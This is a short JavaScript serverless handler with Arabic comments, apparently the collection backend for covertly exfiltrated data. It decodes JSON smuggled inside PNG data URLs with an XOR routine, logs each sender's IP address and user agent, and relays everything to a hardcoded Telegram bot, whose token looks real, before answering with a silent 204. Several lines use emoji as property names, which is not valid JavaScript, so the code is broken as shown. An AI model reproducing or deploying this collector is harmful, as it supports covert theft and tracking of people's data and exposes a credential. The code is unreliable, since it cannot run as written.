// ========================== ملف الاستقبال + تليغرام مباشرة ==========================
// المسار: /api/collector.js
// =====================================================================================

// ❖ ضع توكن البوت وايدي الشات هنا
const BOT_TOKEN = '8488074169:AAFQyGtxJIlRr-k4jVc6ZpRs1mQVyexy8cY';   // ← استبدلها
const CHAT_ID   = '-7932290530';                                      // ← استبدلها

const cache = new Map();
const MAX   = 500;

function uid(){
  return Math.random().toString(36).slice(2)+Date.now().toString(36);
}

// دالة إرسال رسالة إلى تليغرام
async function tgSend(text){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'MarkdownV2'})
  }).catch(()=>{});
}

export default async function handler(req, res){
  if(req.method !== 'POST') return res.status(405).json({خطأ:'الطريقة غير مسموحة'});

  let body = req.body;
  // فك إخفاء PNG إن وُجد
  if(typeof body === 'string' && body.startsWith('data:image/png')){
    const base64 = body.split(',')[1];
    const buff   = Buffer.from(base64,'base64');
    let hidden = '';
    for(let i=41;i<91;i++) hidden += String.fromCharCode(buff[i] ^ buff[i%4]);
    const a = hidden.indexOf('{');
    const b = hidden.lastIndexOf('}');
    if(a===-1||b===-1) return res.status(400).json({خطأ:'فشل فك الإخفاء'});
    try{ body = JSON.parse(hidden.slice(a,b+1)); }
    catch{ return res.status(400).json({خطأ:'JSON تالف'}); }
  }

  const record = {
    🆔: uid(),
    📅: new Date().toLocaleString('ar-EG'),
    🌐: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
    📱: req.headers['user-agent'],
    📊: body
  };

  cache.set(record.🆔, record);
  if(cache.size > MAX) cache.delete(cache.keys().next().value);

  // تجهيز نص التقرير وتجنب حرف ماركداون محجور
  const report = `
*إحصائية زائر جديدة* 👤
\`\`\`
الوقت: ${record.📅}
الآيبي: ${record.🌐}
المتصفح: ${record.📱}
البيانات الكاملة:
${JSON.stringify(record.📊, null, 2)}
\`\`\`
`.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&'); // إسكان أحرف خاصة

  await tgSend(report);

  // رد خفي
  res.status(204).end();
}
